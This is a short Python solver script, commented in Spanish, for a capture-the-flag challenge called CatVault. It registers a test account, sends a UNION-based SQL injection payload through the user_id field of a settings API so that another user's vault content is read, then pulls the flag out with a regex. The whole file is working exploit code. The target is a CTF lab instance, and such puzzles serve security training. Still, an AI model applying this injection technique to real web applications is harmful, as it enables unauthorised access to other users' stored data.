#!/usr/bin/env python3
"""
Script simplificado para resolver CatVault.
Registra/inicia sesión con test:test, inyecta SQL y obtiene la flag.
"""

import requests
import re

BASE_URL = "https://catvault-1-c96e9b8b5bb1.instances.ctf.l3ak.team"

def solve():
    s = requests.Session()
    
    s.post(f"{BASE_URL}/register", data={"username": "test", "password": "test"})
    
    # 2. Iniciar sesión (por si el registro no fue exitoso o el usuario ya existía)
    s.post(f"{BASE_URL}/login", data={"username": "test", "password": "test"})
    
    # 3. Inyectar payload SQL modificando user_id en la sesión
    payload = {"user_id": "0 UNION SELECT 1, content FROM vault WHERE user_id = 1-- -"}
    s.post(f"{BASE_URL}/api/settings", json=payload)
    
    # 4. Obtener la página del vault que ahora contiene la flag
    resp = s.get(f"{BASE_URL}/vault")
    
    # 5. Extraer la flag con regex
    flag_match = re.search(r"L3AK\{[^}]+\}", resp.text)
    if flag_match:
        print(f"Flag: {flag_match.group(0)}")
    else:
        print("No se encontró la flag. Contenido recibido (primeros 800 caracteres):")
        print(resp.text[:800])

if __name__ == "__main__":
    solve()